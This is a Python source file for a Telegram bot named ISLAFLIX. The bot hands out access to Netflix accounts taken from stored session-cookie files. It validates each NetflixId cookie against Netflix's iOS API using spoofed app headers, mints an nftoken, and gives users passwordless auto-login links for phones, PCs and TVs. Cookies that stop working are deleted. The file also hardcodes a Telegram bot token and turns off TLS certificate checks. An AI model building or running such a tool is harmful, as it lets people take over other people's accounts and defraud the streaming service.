import os
import json
import re
import urllib.parse
from datetime import datetime, timedelta
import logging
import random
import sqlite3
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
import requests
from urllib3.exceptions import InsecureRequestWarning

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

BOT_TOKEN = "8965504575:AAECbWvr8fkDLYHc-eFSRV1ir3qMg7J2Nes"

ADMIN_ID = 0  
VIP_IDS = []

COOKIES_DIR = os.path.join(BASE_DIR, "cookies")
VIP_COOKIES_DIR = os.path.join(BASE_DIR, "vipcookies")
USERS_FILE = os.path.join(BASE_DIR, "users.txt")
DB_FILE = os.path.join(BASE_DIR, "bot_limits.db")
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_claims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            claim_time TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_lang (
            user_id INTEGER PRIMARY KEY,
            lang TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_user_lang(user_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT lang FROM user_lang WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

def set_user_lang(user_id, lang):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO user_lang (user_id, lang) VALUES (?, ?)", (user_id, lang))
    conn.commit()
    conn.close()

def check_user_limit(user_id):
    if user_id == ADMIN_ID or user_id in VIP_IDS:
        return True, 0  
        
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    thirty_mins_ago = (datetime.now() - timedelta(minutes=30)).isoformat()
    cursor.execute("DELETE FROM user_claims WHERE claim_time < ?", (thirty_mins_ago,))
    conn.commit()
    
    cursor.execute("SELECT claim_time FROM user_claims WHERE user_id = ? ORDER BY claim_time ASC", (user_id,))
    claims = cursor.fetchall()
    conn.close()
    
    if len(claims) >= 10:
        oldest_str = claims[0][0]
        oldest_claim_time = datetime.fromisoformat(oldest_str)
        reset_time = oldest_claim_time + timedelta(minutes=30)
        remaining_time = reset_time - datetime.now()
        minutes = int(remaining_time.total_seconds() // 60)
        seconds = int(remaining_time.total_seconds() % 60)
        return False, f"{minutes} mins and {seconds} secs" if minutes > 0 else f"{seconds} secs"
        
    return True, 10 - len(claims)

def add_user_claim(user_id):
    if user_id == ADMIN_ID or user_id in VIP_IDS:
        return 
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO user_claims (user_id, claim_time) VALUES (?, ?)", (user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def add_user(user_id):
    user_id_str = str(user_id)
    users = set()
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            users = set(line.strip() for line in f if line.strip())
    if user_id_str not in users:
        with open(USERS_FILE, "a", encoding="utf-8") as f:
            f.write(user_id_str + "\n")

def get_total_users():
    if not os.path.exists(USERS_FILE):
        return 0
    with open(USERS_FILE, "r", encoding="utf-8") as f:
        return sum(1 for line in f if line.strip())

def get_stock_count(target_dir):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
        return 0
    files = [f for f in os.listdir(target_dir) if f.endswith(".txt")]
    return len(files)

def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}

def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value

def extract_cookie_dict(text):
    cookie_dict = {}
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict

def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return None, None

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        response = requests.get(
            API_URL,
            params=QUERY_PARAMS,
            headers=headers,
            timeout=7,
            verify=False,
        )
        if response.status_code == 200:
            data = response.json()
            token_data = (
                (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
                or {}
            )
            token = token_data.get("token")
            expires = token_data.get("expires")
            if token:
                if isinstance(expires, int) and len(str(expires)) == 13:
                    expires //= 1000
                return token, expires
    except Exception:
        pass
    return None, None

def get_working_cookie_and_token_sync(is_vip):
    target_dir = VIP_COOKIES_DIR if is_vip else COOKIES_DIR
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    files = [f for f in os.listdir(target_dir) if f.endswith(".txt")]
    if not files:
        return None, None

    random.shuffle(files)

    for filename in files:
        file_path = os.path.join(target_dir, filename)
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                raw_text = f.read()
            
            cookie_dict = extract_cookie_dict(raw_text)
            if not cookie_dict:
                os.remove(file_path)
                continue

            token, _ = fetch_nftoken(cookie_dict)
            if token:
                return file_path, token
            else:
                os.remove(file_path)
        except Exception:
            try:
                os.remove(file_path)
            except Exception:
                pass
    return None, None

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    add_user(message.from_user.id)
    
    builder = InlineKeyboardBuilder()
    builder.button(text="🇵🇭 Pilipino", callback_data="lang_ph")
    builder.button(text="🇬🇧 English", callback_data="lang_en")
    builder.adjust(2)

    text = "🌐 **Please choose your preferred language / Mangyaring piliin ang iyong gustong wika:**"
    await message.answer(text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("lang_"))
async def process_language(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    lang = callback.data.split("_")[1]
    set_user_lang(callback.from_user.id, lang)
    await show_rules_and_intro(callback.message, lang)

async def show_rules_and_intro(message: types.Message, lang: str):
    builder = InlineKeyboardBuilder()
    
    if lang == "ph":
        text = (
            " ══════════════════ \n"
            " 🌟 **ISLAFLIX BOT** 🌟\n"
            " ══════════════════ \n\n"
            "👨‍💻 **Developer & Creator:** Developed by **Islam**.\n"
            "📌 **About Bot:** An intelligent platform provided completely free to generate and run official Netflix accounts easily.\n\n"
            "⚠️ **Important Terms & Conditions:**\n"
            " ┣ 🎁 **The bot is 100% FREE for everyone** with no fees.\n"
            " ┣ 🚫 **Selling accounts is strictly prohibited**, violators will be permanently banned.\n"
            " ┗ 🛡️ **Anti-Spam Policy:** Limited to **10 accounts max** every **30 minutes** to ensure fair use.\n\n"
            "✨ *Sa pamamagitan ng pag-click sa (Sumasang-ayon at Magpatuloy), tinatanggap mo ang mga panuntunan at nangangakong hindi ibebenta ang mga account.*"
        )
        builder.button(text="✅ Sumasang-ayon at Magpatuloy", callback_data="check_user_type")
    else:
        text = (
            " ══════════════════ \n"
            "  🌟 **ISLAFLIX BOT** 🌟\n"
            " ══════════════════ \n\n"
            "👨‍💻 **Developer & Creator:** Developed by **Islam**.\n"
            "📌 **About Bot:** An intelligent platform provided completely free to generate and run official Netflix accounts easily.\n\n"
            "⚠️ **Important Terms & Conditions:**\n"
            " ┣ 🎁 **The bot is 100% FREE for everyone** with no fees.\n"
            " ┣ 🚫 **Selling accounts is strictly prohibited**, violators will be permanently banned.\n"
            " ┗ 🛡️ **Anti-Spam Policy:** Limited to **10 accounts max** every **30 minutes** to ensure fair use.\n\n"
            "✨ *By clicking (Agree & Continue), you accept the rules and pledge not to sell the accounts.*"
        )
        builder.button(text="✅ Agree & Continue", callback_data="check_user_type")
        
    builder.adjust(1)
    await message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "check_user_type")
async def choose_user_type(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    lang = get_user_lang(callback.from_user.id) or "en"
    
    builder = InlineKeyboardBuilder()
    if lang == "ph":
        builder.button(text="👤 Normal User", callback_data="mode_normal")
        builder.button(text="💎 VIP Member (Exclusive Premium)", callback_data="mode_vip")
        text = (
            "🔍 **Piliin ang uri ng iyong account upang magpatuloy:**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👤 **Normal User:** Pangkalahatang access sa cookies (Max 10 accounts bawat 30 minuto).\n"
            "💎 **VIP Member:** Direktang access sa mga eksklusibong premium account (nangangailangan ng rehistradong ID)."
        )
    else:
        builder.button(text="👤 Normal User", callback_data="mode_normal")
        builder.button(text="💎 VIP Member (Exclusive Premium)", callback_data="mode_vip")
        text = (
            "🔍 **Select your account type to proceed:**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "👤 **Normal User:** General cookies access (Max 10 accounts every 30 minutes).\n"
            "💎 **VIP Member:** Direct access to exclusive premium accounts (requires registered ID)."
        )
        
    builder.adjust(1)
    await callback.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "mode_normal")
async def enter_normal_mode(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
    await show_main_menu(callback, is_vip=False)

@dp.callback_query(F.data == "mode_vip")
async def enter_vip_mode(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    user_id = callback.from_user.id
    lang = get_user_lang(user_id) or "en"
    
    if user_id == ADMIN_ID or user_id in VIP_IDS:
        await show_main_menu(callback, is_vip=True)
    else:
        if lang == "ph":
            error_text = (
                "❌ **Pasensya na, ang iyong ID ay hindi nakarehistro sa listahan ng VIP!**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ Ang seksyong ito ay para lamang sa mga miyembro ng VIP."
            )
        else:
            error_text = (
                "❌ **Sorry, your ID is not registered in the VIP list!**\n"
                "━━━━━━━━━━━━━━━━━━━\n"
                "⚠️ This section is for VIP members only."
            )
        await callback.message.edit_text(error_text, parse_mode="Markdown")

async def show_main_menu(callback: types.CallbackQuery, is_vip: bool):
    user_id = callback.from_user.id
    lang = get_user_lang(user_id) or "en"
    
    target_stock_dir = VIP_COOKIES_DIR if is_vip else COOKIES_DIR
    stock = get_stock_count(target_stock_dir)
    status_icon = "🟢" if stock > 0 else "🔴"
    
    builder = InlineKeyboardBuilder()
    mode_suffix = "_vip" if is_vip else "_normal"
    
    if lang == "ph":
        builder.button(text="📱  Bumuo ng Account (Mobile)", callback_data=f"dev_phone{mode_suffix}")
        builder.button(text="💻  Bumuo ng Account (PC / Laptop)", callback_data=f"dev_pc{mode_suffix}")
        builder.button(text="📺  Bumuo ng Account (Smart TV)", callback_data=f"dev_tv{mode_suffix}")
        
        if user_id == ADMIN_ID and is_vip:
            builder.button(text="📊 Admin Dashboard & Stats", callback_data="admin_stats")
            builder.button(text="🧹 Linisin ang Sirang Cookies", callback_data="clean_cookies")
            
        builder.adjust(1)
        
        welcome_text = (
            "╔══════════════════════════╗\n"
            "         🔥 **ISLAFLIX OFFICIAL** 🔥\n"
            "╚══════════════════════════╝\n\n"
            f"{'👑 *Maligayang pagdating sa eksklusibong seksyon ng VIP Premium!*' if is_vip else '👑 *Maligayang pagdating sa normal na seksyon ng Netflix bot.*'}\n\n"
            f"{'🌟 **Uri ng Stock:** Direktang paghila mula sa stock ng premium (`vipcookies`).' if is_vip else '🛡️ **Sistema ng Proteksyon:** Limitado sa **10 account max** bawat **30 minuto**.'}\n\n"
            f"📊 **Magagamit na Stock para sa iyo:**\n"
            f" ┣ 📦 Mga Available na Account: **`{stock}`** handang account\n"
            f" ┗ ⚡ Katayuan ng Server: {status_icon} **`{'Online at Ganap na Gumagana' if stock > 0 else 'Wala nang Stock'}`**\n\n"
            "💎 *Piliin ang uri ng iyong device mula sa mga premium na button sa ibaba:*"
        )
    else:
        builder.button(text="📱  Generate Account (Mobile)", callback_data=f"dev_phone{mode_suffix}")
        builder.button(text="💻  Generate Account (PC / Laptop)", callback_data=f"dev_pc{mode_suffix}")
        builder.button(text="📺  Generate Account (Smart TV)", callback_data=f"dev_tv{mode_suffix}")
        
        if user_id == ADMIN_ID and is_vip:
            builder.button(text="📊 Admin Dashboard & Stats", callback_data="admin_stats")
            builder.button(text="🧹 Clean Broken Cookies", callback_data="clean_cookies")
            
        builder.adjust(1)
        
        welcome_text = (
            "╔══════════════════════════╗\n"
            "         🔥 **ISLAFLIX OFFICIAL** 🔥\n"
            "╚══════════════════════════╝\n\n"
            f"{'👑 *Welcome to the exclusive VIP Premium section!*' if is_vip else '👑 *Welcome to the normal Netflix bot section.*'}\n\n"
            f"{'🌟 **Stock Type:** Direct pull from premium stock (`vipcookies`).' if is_vip else '🛡️ **Protection System:** Maximum limit is **10 accounts** every **30 minutes**.'}\n\n"
            f"📊 **Available Stock for You:**\n"
            f" ┣ 📦 Available Accounts: **`{stock}`** ready accounts\n"
            f" ┗ ⚡ Server Status: {status_icon} **`{'Online & Fully Operational' if stock > 0 else 'Out of Stock'}`**\n\n"
            "💎 *Select your device type from the premium buttons below:*"
        )
        
    await callback.message.edit_text(welcome_text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "admin_stats")
async def admin_statistics(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    if callback.from_user.id != ADMIN_ID:
        return

    total_users = get_total_users()
    normal_stock = get_stock_count(COOKIES_DIR)
    vip_stock = get_stock_count(VIP_COOKIES_DIR)

    stats_text = (
        "👑 **Admin Dashboard - ISLAFLIX**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Registered Users: **`{total_users}`** users\n"
        f"📦 Normal User Accounts (`cookies`): **`{normal_stock}`** accounts\n"
        f"💎 VIP Premium Accounts (`vipcookies`): **`{vip_stock}`** accounts\n"
        f"🌟 Total VIP Members Added: **`{len(VIP_IDS)}`** members\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "💡 *The bot completely isolates VIP accounts from normal users.*"
    )
    
    builder = InlineKeyboardBuilder()
    await callback.message.edit_text(stats_text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data == "clean_cookies")
async def manual_clean_cookies(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass
        
    if callback.from_user.id != ADMIN_ID:
        return

    await callback.message.edit_text(
        "🧹 **Checking and cleaning all accounts (Normal & VIP)...**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "🔄 *Please wait, testing validity of all files now.*",
        parse_mode="Markdown"
    )

    def background_clean():
        removed_count = 0
        for target_dir in [COOKIES_DIR, VIP_COOKIES_DIR]:
            if os.path.exists(target_dir):
                files = [f for f in os.listdir(target_dir) if f.endswith(".txt")]
                for filename in files:
                    file_path = os.path.join(target_dir, filename)
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                            raw_text = f.read()
                        cookie_dict = extract_cookie_dict(raw_text)
                        if not cookie_dict:
                            os.remove(file_path)
                            removed_count += 1
                            continue
                        
                        token, _ = fetch_nftoken(cookie_dict)
                        if not token:
                            os.remove(file_path)
                            removed_count += 1
                    except Exception:
                        try:
                            os.remove(file_path)
                            removed_count += 1
                        except Exception:
                            pass
        return removed_count

    removed_count = await asyncio.to_thread(background_clean)
    normal_final = get_stock_count(COOKIES_DIR)
    vip_final = get_stock_count(VIP_COOKIES_DIR)
    
    clean_result_text = (
        "✅ **Scan and cleaning process completed successfully!**\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"🗑️ Removed Broken Files: **`{removed_count}`** files\n"
        f"📦 Remaining Normal Stock: **`{normal_final}`** accounts\n"
        f"💎 Remaining VIP Premium Stock: **`{vip_final}`** accounts"
    )

    builder = InlineKeyboardBuilder()
    await callback.message.edit_text(clean_result_text, reply_markup=builder.as_markup(), parse_mode="Markdown")

@dp.callback_query(F.data.startswith("dev_"))
async def process_device_selection(callback: types.CallbackQuery):
    try:
        await callback.answer()
    except Exception:
        pass

    user_id = callback.from_user.id
    lang = get_user_lang(user_id) or "en"

    parts = callback.data.split("_")
    device = parts[1]
    mode_type = parts[2]
    is_vip = (mode_type == "vip")

    if not is_vip:
        allowed, info = check_user_limit(user_id)
        if not allowed:
            if lang == "ph":
                limit_msg = (
                    "🛑 **Lumampas ka sa pinapayagang limitasyon!**\n"
                    "━━━━━━━━━━━━━━━━━━━\n"
                    "⚠️ Maaari kang kumuha ng **maximum na 10 account bawat 30 minuto**.\n"
                    f"⏳ Mangyaring maghintay ng: **`{info}`** upang makabuo ng mga bagong account."
                )
            else:
                limit_msg = (
                    "🛑 **You have exceeded your limit!**\n"
                    "━━━━━━━━━━━━━━━━━━━\n"
                    "⚠️ You can extract **a maximum of 10 accounts every 30 minutes**.\n"
                    f"⏳ Please wait for: **`{info}`** to generate new accounts."
                )
            await callback.message.edit_text(
                limit_msg,
                parse_mode="Markdown"
            )
            return

    wait_text = "⏳ **Sinusuri ang stock at kumukuha ng malinis na sesyon...**\n🔄 *Mangyaring maghintay ng sandali...*" if lang == "ph" else "⏳ **Checking stock and extracting a clean session...**\n🔄 *Please wait a moment...*"
    await callback.message.edit_text(wait_text, parse_mode="Markdown")

    _, token = await asyncio.to_thread(get_working_cookie_and_token_sync, is_vip)

    if not token:
        target_dir = VIP_COOKIES_DIR if is_vip else COOKIES_DIR
        stock = get_stock_count(target_dir)
        
        if lang == "ph":
            no_stock_msg = (
                "❌ **Pasensya na, ang mga account para sa seksyong ito ay kasalukuyang walang stock!**\n\n"
                f"📦 Natitirang Stock: **`{stock}`** mga account\n"
                "⚠️ *Mangyaring subukang muli mamaya.*"
            )
        else:
            no_stock_msg = (
                "❌ **Sorry, accounts for this section are currently out of stock!**\n\n"
                f"📦 Remaining Stock: **`{stock}`** accounts\n"
                "⚠️ *Please try later.*"
            )
        await callback.message.edit_text(
            no_stock_msg,
            parse_mode="Markdown"
        )
        return

    if not is_vip:
        add_user_claim(user_id)

    if device == "phone":
        url = f"https://netflix.com/unsupported?nftoken={token}"
        instructions = (
            "📱 **Mga Tagubilin (Mobile):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **Mahalaga:** Gamitin ang browser na **Google Chrome**!\n\n"
            "1️⃣ I-click ang button sa ibaba para buksan o kopyahin ang link.\n"
            "2️⃣ Buksan ang **Google Chrome** at i-paste ang link.\n"
            "3️⃣ I-click ang **Open App** upang agad na pumasok sa Netflix!"
        ) if lang == "ph" else (
            "📱 **Instructions (Mobile):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **Important:** Use **Google Chrome** browser!\n\n"
            "1️⃣ Click the button below to open or copy the link.\n"
            "2️⃣ Open **Google Chrome** and paste the link.\n"
            "3️⃣ Click **Open App** to enter Netflix!"
        )
    elif device == "pc":
        url = f"https://www.netflix.com/login?nftoken={token}"
        instructions = (
            "💻 **Mga Tagubilin (PC / Laptop):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **Mahalaga:** Mas mabuting gamitin ang **Google Chrome**.\n\n"
            "1️⃣ Buksan ang link sa ibaba sa pamamagitan ng iyong browser.\n"
            "2️⃣ Awtomatiko kang mag-a-login nang walang password!"
        ) if lang == "ph" else (
            "💻 **Instructions (PC / Laptop):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ **Important:** Use **Google Chrome**.\n\n"
            "1️⃣ Open the link below in your browser.\n"
            "2️⃣ You will be logged in automatically without a password!"
        )
    elif device == "tv":
        url = f"https://netflix.com/tv2?nftoken={token}"
        instructions = (
            "📺 **Mga Tagubilin (Smart TV):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "1️⃣ Buksan ang Netflix sa iyong TV at kunin ang activation code.\n"
            "2️⃣ Buksan ang link sa ibaba sa browser ng iyong telepono o PC upang maiugnay ito."
        ) if lang == "ph" else (
            "📺 **Instructions (Smart TV):**\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            "1️⃣ Open Netflix on TV and get the code.\n"
            "2️⃣ Open the link below on your phone or PC browser to link it."
        )

    if is_vip:
        remaining_text = " (VIP Premium Account - Unlimited Access 🌟)" if lang == "ph" else " (VIP Premium Account - Unlimited Access 🌟)"
    else:
        _, remaining_or_time = check_user_limit(user_id)
        remaining_text = f" Ang iyong natitirang balanse sa susunod na 30m: `{remaining_or_time}` mga account." if lang == "ph" else f" Your remaining balance in the next 30m: `{remaining_or_time}` accounts."

    link_title = "🌐 Buksan ang Link sa Browser" if lang == "ph" else "🌐 Open Link in Browser"
    btn_another = "🔄 Bumuo ng Iba Pa" if lang == "ph" else "🔄 Generate Another"

    response_msg = (
        f"{instructions}\n\n"
        f"🔗 **Direct Access Link:**\n"
        f"`{url}`\n\n"
        f"🛡️{remaining_text}\n"
        "🔒 *Ang link na ito ay ligtas at para lamang sa iyo.*"
    )
    
    builder = InlineKeyboardBuilder()
    builder.button(text=link_title, url=url)
    builder.button(text=btn_another, callback_data=f"dev_{device}_{mode_type}")
    builder.adjust(1)

    await callback.message.edit_text(response_msg, reply_markup=builder.as_markup(), parse_mode="Markdown")

if __name__ == "__main__":
    print("ISLAFLIX Ultimate Professional Bot is running successfully...")
    asyncio.run(dp.start_polling(bot))
